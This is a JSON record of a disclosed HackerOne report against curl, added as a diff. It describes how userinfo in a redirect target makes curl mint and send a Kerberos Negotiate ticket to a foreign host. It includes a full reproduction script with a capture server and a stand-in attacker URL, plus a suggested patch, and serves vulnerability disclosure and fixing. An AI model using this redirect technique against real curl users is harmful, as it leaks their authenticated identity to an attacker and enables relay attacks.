@@ -1,0 +1,111 @@
+{
+  "id": 4040551,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDQwNTUx",
+  "url": "https://hackerone.com/reports/4040551",
+  "title": "CVE-2026-94265: Authorization: Negotiate sent to foreign origin",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2026-09-18T17:12:19.921Z",
+  "submitted_at": "2026-09-18T17:12:20.122Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-94265"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-10-14T07:19:21.998Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-10-14T06:38:05.957Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi all,\n\nI've discovered that curl can be made to send an \"Authorization: Negotiate\" header, carrying a freshly minted Kerberos ticket for the victim's ambient identity, to a host chosen by an HTTP redirect, without --location-trusted. All the attacker has to do is put arbitrary userinfo in the Location header they redirect to. This contradicts the guarantee documented for CURLOPT_UNRESTRICTED_AUTH, which says that with the option unset libcurl \"does not send custom nor internally generated Authorization: or Cookie: headers on requests done to other hosts than the one used for the initial URL\".\n\nI have an end-to-end PoC against a real KDC on pristine upstream d1823ebc17e5778c30f8a6b2221a057ec607a9b7 (8.23.0-DEV), a control showing the protection holds when the userinfo is removed, and a small fix that I have verified closes it without regressing either normal Negotiate or --location-trusted. Details below.\n\nHow it works\n------------\n\nThe gate asks \"do I have any credentials?\" when it should ask \"am I still on the original host?\"\n\n```\n  https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L872-L878\n\n    /* Either we have credentials for the origin we talk to or\n       performing authentication is allowed here */\n    if(data->state.creds || Curl_auth_allowed_to_host(data))\n      result = output_auth_headers(data, conn, authhost, request,\n                                   path_and_query, FALSE);\n    else\n      authhost->done = TRUE;\n```\n\nThat \"||\" is the whole vulnerability. Either condition is enough.\n\nThe flow:\n\n  1. You run `curl --negotiate -L http://intranet/` - Kerberos SSO, no password typed.\n  2. `intranet` redirects you to `http://bob:alice@attacker.example/`.\n  3. curl correctly drops *your* credentials, because it is a different host. But it then parses `bob:alice` out of the attacker's own URL and stores it in state.creds. That path has no origin check.\n  4. Gate: credentials exist -> proceed. The origin check is never consulted.\n  5. The Negotiate branch runs. It throws `bob:alice` away, goes to the KDC, and gets a fresh Kerberos ticket for HTTP/attacker.example. Sends it.\n\nThe attacker now holds a Kerberos AP-REQ for their own service, proving your identity.\n\nWhat makes it odd is that a credential which is never used unlocks an authentication that does not use credentials. `bob:alice` is neither forwarded nor checked. Its only job is to be non-NULL.\n\nSame PoC, one change, which is the proof that this and nothing else is the cause:\n\n  | Redirect target                    | Attacker receives                                   |\n  |------------------------------------|-----------------------------------------------------|\n  | http://bob:alice@attacker.example/ | Authorization: Negotiate <ticket for HTTP/attacker> |\n  | http://attacker.example/           | nothing                                             |\n\n\nCode paths\n----------\n\n1. Application-set credentials ARE origin-checked, so yours are correctly dropped on the redirect.\n```\n   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/url.c#L1355-L1360\n\n    if((CURL_EASY_STR(data, STRING_USERNAME) ||\n        CURL_EASY_STR(data, STRING_PASSWORD) ||\n        CURL_EASY_STR(data, STRING_BEARER) ||\n        CURL_EASY_STR(data, STRING_SASL_AUTHZID) ||\n        CURL_EASY_STR(data, STRING_SERVICE_NAME)) &&\n       Curl_auth_allowed_to_origin(data, data->state.origin)) {\n```\n\n2. Credentials taken from the URL are NOT origin-checked. The redirect target is attacker-chosen, so this repopulates state.creds for the foreign origin.\n```\n   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/url.c#L1383-L1391\n\n    if(!newcreds || !Curl_creds_has_user(newcreds)) {\n      char *user = NULL;\n      char *passwd = NULL;\n      char *udecoded = NULL;\n      char *pdecoded = NULL;\n      CURLUcode uc;\n  \n      uc = curl_url_get(uh, CURLUPART_USER, &user, 0);\n      if(uc && (uc != CURLUE_NO_USER))\n```\n\n3. The gate accepts that, and output_auth_headers() runs for the foreign origin.\n   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L874\n\n4. The HTTPSIG branch guards against exactly this. The Negotiate branch directly below it does not - it only checks that the application did not set its own header.\n```\n   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L671-L704\n\n  #ifndef CURL_DISABLE_HTTPSIG\n    if((authstatus->picked == CURLAUTH_HTTPSIG) && !proxy) {\n      /* HTTPSIG uses its own configured key material rather than\n         data->state.creds. Do not let unrelated credentials from a\n         redirected URL bypass the cross-host auth boundary. */\n      if(Curl_auth_allowed_to_host(data)) {\n        auth = \"HTTPSIG\";\n        result = Curl_output_httpsig(data);\n        if(result)\n          return result;\n      }\n      else\n        authstatus->done = TRUE;\n    }\n    else\n  #endif\n  #ifdef USE_SPNEGO\n    if(authstatus->picked == CURLAUTH_NEGOTIATE) {\n      if(\n  #ifndef CURL_DISABLE_PROXY\n        (proxy && !Curl_checkProxyheaders(data, conn,\n                                          STRCONST(\"Proxy-authorization\"))) ||\n  #endif\n        (!proxy && !Curl_checkheaders(data, STRCONST(\"Authorization\")))) {\n        auth = \"Negotiate\";\n        result = Curl_output_negotiate(data, conn, proxy);\n        if(result)\n          return result;\n      }\n      else\n        authstatus->done = TRUE;\n    }\n    else\n  #endif\n```\n\n5. Negotiate needs no username, so the ambient credential cache is used. The credentials that unlocked the gate are explicitly discarded.\n```\n   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/vauth/spnego_gssapi.c#L92\n\n    (void)creds;\n```\n\n6. The SPN is built from the CURRENT origin, which is the attacker's hostname.\n```\n   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http_negotiate.c#L77\n\n      host = data->state.origin->hostname;\n   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http_negotiate.c#L126-L127\n\n    result = Curl_auth_decode_spnego_message(data, creds, \"HTTP\",\n                                             host, header, neg_ctx);\n```\n\n7. The boundary being bypassed.\n```\n   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/vauth/vauth.c#L140-L149\n\n  bool Curl_auth_allowed_to_host(struct Curl_easy *data)\n  {\n    return Curl_auth_allowed_to_origin(data, data->state.origin);\n  }\n  \n  bool Curl_auth_allowed_to_origin(struct Curl_easy *data,\n                                   struct Curl_peer *origin)\n  {\n    return data->set.allow_auth_to_other_hosts ||\n           Curl_peer_equal(data->state.initial_origin, origin);\n```\n\n8. Worth noting that a CUSTOM Authorization header is already blocked cross-host. Only the internally generated one is not.\n   https://github.com/curl/curl/blob/d1823ebc17e5778c30f8a6b2221a057ec607a9b7/lib/http.c#L1878-L1883\n\n```\n        else if((curlx_str_casecompare(&name, \"Authorization\") ||\n                 curlx_str_casecompare(&name, \"Cookie\")) &&\n                /* be careful of sending this potentially sensitive header to\n                   other hosts */\n                !Curl_auth_allowed_to_host(data))\n          ;\n```\n\nReproduction\n------------\n\nVerified on pristine upstream curl/curl d1823ebc17e5778c30f8a6b2221a057ec607a9b7 (8.23.0-DEV, GSS-API + SPNEGO, MIT krb5 1.22.2), and also on 557e43b237 of my own tree (8.22.1-DEV). Build with -DCURL_USE_GSSAPI=ON so that `curl -V` lists SPNEGO.\n\n```\n  VF_CURL=<curl-with-spnego> sh reproduce.sh exploit\n  VF_CURL=<curl-with-spnego> sh reproduce.sh control\n```\n\nThe script stands up a throwaway MIT Kerberos realm (KDC, one user principal, two service principals), kinits a victim who has never heard of attacker.poc.test, and runs curl against a legit origin that 301-redirects to an attacker origin. The only difference between the two arms is whether the Location header carries userinfo.\n\nResults:\n\n  exploit: attacker origin received Authorization: Negotiate (1060 b64 chars)\n    AP-REQ principal fields: ['POC.TEST', 'HTTP', 'attacker.poc.test']\n  control: attacker origin received NO Authorization header\n\nThe token is a SPNEGO wrapper (OID 1.3.6.1.5.5.2) over a krb5 AP-REQ (OID 1.2.840.113554.1.2.2) whose ticket sname is HTTP/attacker.poc.test in realm POC.TEST. legit.poc.test does not appear anywhere in it, so it is a newly minted ticket rather than a replay of the one sent to the first host. klist afterwards confirms the KDC issued HTTP/attacker.poc.test@POC.TEST to the victim, for a host the caller never asked to contact.\n\n  reproduce.sh:\n  ```sh\n  #!/bin/sh\n  # Reproduces the cross-origin SPNEGO/Negotiate leak in lib/http.c.\n  #\n  # Env overrides (defaults suit a Homebrew MIT krb5 on macOS):\n  #   VF_CURL   - curl built with SPNEGO (`curl -V` must list GSS-API or SPNEGO)\n  #   VF_WORK   - scratch dir                        (default /tmp/vf-nego)\n  #   VF_KRB5   - MIT krb5 prefix                    (default /opt/homebrew/opt/krb5)\n  #   VF_KDCP   - KDC port                           (default 19188)\n  #   VF_APORT  - \"legit\" origin port                (default 19218)\n  #   VF_BPORT  - \"attacker\" origin port             (default 19219)\n  set -e\n  MODE=\"$1\"\n  WORK=\"${VF_WORK:-/tmp/vf-nego}\"\n  KRB5=\"${VF_KRB5:-/opt/homebrew/opt/krb5}\"\n  KDCP=\"${VF_KDCP:-19188}\"\n  APORT=\"${VF_APORT:-19218}\"\n  BPORT=\"${VF_BPORT:-19219}\"\n  CURL_BIN=\"${VF_CURL:-curl}\"\n  MARKER=\"$WORK/attacker-received-negotiate\"\n  \n  # Clean at the START of every arm: both arms share one work dir, so the control\n  # must not inherit a marker left by the exploit arm.\n  pkill -f \"krb5kdc -n -P $WORK/kdc.pid\" 2>/dev/null || true\n  rm -rf \"$WORK\"\n  mkdir -p \"$WORK/db\"\n  \n  # Exploit: the redirect Location carries unrelated userinfo, which makes\n  # data->state.creds non-NULL for the foreign origin and satisfies the\n  # `data->state.creds ||` half of the gate at lib/http.c:874.\n  # Control: identical, but no userinfo -> the gate correctly blocks the header.\n  if [ \"$MODE\" = \"exploit\" ]; then\n    LOC=\"http://bob:alice@attacker.poc.test:$BPORT/step2\"\n  else\n    LOC=\"http://attacker.poc.test:$BPORT/step2\"\n  fi\n  \n  # --- Throwaway Kerberos realm: test infrastructure only, NOT the target. ---\n  cat > \"$WORK/krb5.conf\" <<EOF\n  [libdefaults]\n      default_realm = POC.TEST\n      dns_lookup_kdc = false\n      dns_lookup_realm = false\n      rdns = false\n  [realms]\n      POC.TEST = {\n          kdc = 127.0.0.1:$KDCP\n      }\n  [domain_realm]\n      .poc.test = POC.TEST\n      poc.test = POC.TEST\n  EOF\n  cat > \"$WORK/kdc.conf\" <<EOF\n  [kdcdefaults]\n      kdc_ports = $KDCP\n      kdc_tcp_ports = $KDCP\n  [realms]\n      POC.TEST = {\n          database_name = $WORK/db/principal\n          key_stash_file = $WORK/db/stash\n          acl_file = $WORK/db/kadm5.acl\n          supported_enctypes = aes256-cts:normal\n      }\n  EOF\n  export KRB5_CONFIG=\"$WORK/krb5.conf\"\n  export KRB5_KDC_PROFILE=\"$WORK/kdc.conf\"\n  export KRB5CCNAME=\"$WORK/victim.ccache\"\n  \n  \"$KRB5/sbin/kdb5_util\" create -s -P testmaster -r POC.TEST >/dev/null\n  # The victim's realm contains an SPN for the attacker's host. The victim has\n  # never heard of it; only the KDC's realm membership matters.\n  \"$KRB5/sbin/kadmin.local\" -q \"addprinc -pw victimpass victim\"            >/dev/null 2>&1\n  \"$KRB5/sbin/kadmin.local\" -q \"addprinc -randkey HTTP/legit.poc.test\"     >/dev/null 2>&1\n  \"$KRB5/sbin/kadmin.local\" -q \"addprinc -randkey HTTP/attacker.poc.test\"  >/dev/null 2>&1\n  \"$KRB5/sbin/krb5kdc\" -n -P \"$WORK/kdc.pid\" > \"$WORK/kdc.log\" 2>&1 &\n  KDC_PID=$!\n  i=0; while [ $i -lt 30 ]; do i=$((i+1)); sleep 0.1; done\n  printf 'victimpass\\n' | \"$KRB5/bin/kinit\" victim >/dev/null\n  \n  # --- Origin A (\"legit\"): redirects to origin B. ---\n  cat > \"$WORK/a.py\" <<EOF\n  import http.server, sys\n  class H(http.server.BaseHTTPRequestHandler):\n      def do_GET(self):\n          self.send_response(301)\n          self.send_header(\"Location\", \"$LOC\")\n          self.send_header(\"Content-Length\", \"0\")\n          self.end_headers()\n      def log_message(self, *a): pass\n  http.server.HTTPServer((\"127.0.0.1\", $APORT), H).serve_forever()\n  EOF\n  \n  # --- Origin B (\"attacker\"): reached only via A's redirect. Records whether the\n  #     victim's client presented an ambient-credential Negotiate token. ---\n  cat > \"$WORK/b.py\" <<EOF\n  import http.server, sys\n  class H(http.server.BaseHTTPRequestHandler):\n      def do_GET(self):\n          a = self.headers.get(\"Authorization\")\n          if a and a.lower().startswith(\"negotiate\"):\n              open(\"$MARKER\", \"w\").write(a.split(\" \", 1)[1].strip())\n          self.send_response(200)\n          self.send_header(\"Content-Length\", \"0\")\n          self.end_headers()\n      def log_message(self, *a): pass\n  http.server.HTTPServer((\"127.0.0.1\", $BPORT), H).serve_forever()\n  EOF\n  \n  python3 \"$WORK/a.py\" & A_PID=$!\n  python3 \"$WORK/b.py\" & B_PID=$!\n  i=0; while [ $i -lt 20 ]; do i=$((i+1)); sleep 0.1; done\n  \n  : > \"${VF_READY:-/dev/null}\"\n  \n  # Exercise the shipped curl exactly ONCE. Identical command in both arms.\n  # --negotiate selects SPNEGO; note the ABSENCE of --location-trusted.\n  timeout 20 \"$CURL_BIN\" -sS --negotiate --location \\\n    --resolve \"legit.poc.test:$APORT:127.0.0.1\" \\\n    --resolve \"attacker.poc.test:$BPORT:127.0.0.1\" \\\n    \"http://legit.poc.test:$APORT/start\" -o /dev/null 2>\"$WORK/curl.err\" || true\n  \n  { kill \"$A_PID\" \"$B_PID\" \"$KDC_PID\"; wait; } 2>/dev/null || true\n  \n  if [ -f \"$MARKER\" ]; then\n    echo \"$MODE: attacker origin received Authorization: Negotiate ($(wc -c < \"$MARKER\" | tr -d ' ') b64 chars)\"\n    python3 - \"$MARKER\" <<'PY'\n  import base64, sys\n  raw = base64.b64decode(open(sys.argv[1]).read())\n  runs, i = [], 0\n  while i < len(raw):\n      if raw[i] == 0x1b and 0 < raw[i+1] < 64:\n          s = raw[i+2:i+2+raw[i+1]]\n          if all(32 <= c < 127 for c in s) and len(s) >= 4:\n              runs.append(s.decode()); i += 2 + raw[i+1]; continue\n      i += 1\n  print(\"  AP-REQ principal fields:\", runs)\n  PY\n  else\n    echo \"$MODE: attacker origin received NO Authorization header\"\n  fi\n  ```\n\n\nSuggested fix\n-------------\n\n\n```\n  diff --git a/lib/http.c b/lib/http.c\n  index 3ed023753d..4b31cc2376 100644\n  --- a/lib/http.c\n  +++ b/lib/http.c\n  @@ -691,7 +691,8 @@ static CURLcode output_auth_headers(struct Curl_easy *data,\n         (proxy && !Curl_checkProxyheaders(data, conn,\n                                           STRCONST(\"Proxy-authorization\"))) ||\n   #endif\n  -      (!proxy && !Curl_checkheaders(data, STRCONST(\"Authorization\")))) {\n  +      (!proxy && !Curl_checkheaders(data, STRCONST(\"Authorization\")) &&\n  +       Curl_auth_allowed_to_host(data))) {\n         auth = \"Negotiate\";\n         result = Curl_output_negotiate(data, conn, proxy);\n         if(result)\n  @@ -704,10 +705,14 @@ static CURLcode output_auth_headers(struct Curl_easy *data,\n   #endif\n   #ifdef USE_NTLM\n     if(authstatus->picked == CURLAUTH_NTLM) {\n  -    auth = \"NTLM\";\n  -    result = Curl_output_ntlm(data, proxy);\n  -    if(result)\n  -      return result;\n  +    if(proxy || Curl_auth_allowed_to_host(data)) {\n  +      auth = \"NTLM\";\n  +      result = Curl_output_ntlm(data, proxy);\n  +      if(result)\n  +        return result;\n  +    }\n  +    else\n  +      authstatus->done = TRUE;\n     }\n     else\n   #endif\n```\n\nCheers,\nJosh\n\n## Impact\n\nThe attacker controls the long-term key for the SPN they redirected you to (think: website with an open redirect vulnerability), so they can decrypt the AP-REQ and learn your authenticated identity. With CURLOPT_GSSAPI_DELEGATION the ticket is forwardable, and on Windows SSPI an unknown SPN falls back to NTLM, which yields a relay-able NTLM exchange. I did not demonstrate either of those two outcomes, so they are not reflected in the CVSS score above.\n\nNote this is not the classic \"credential leak on redirect\" pattern where an existing header value is forwarded to a new host. curl performs a complete, fresh authentication handshake against the attacker's service on your behalf, so the exposure is not bounded by what you previously sent.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 1,
+  "voters": [
+    "nahidwin0x"
+  ],
+  "severity": {
+    "rating": "none",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
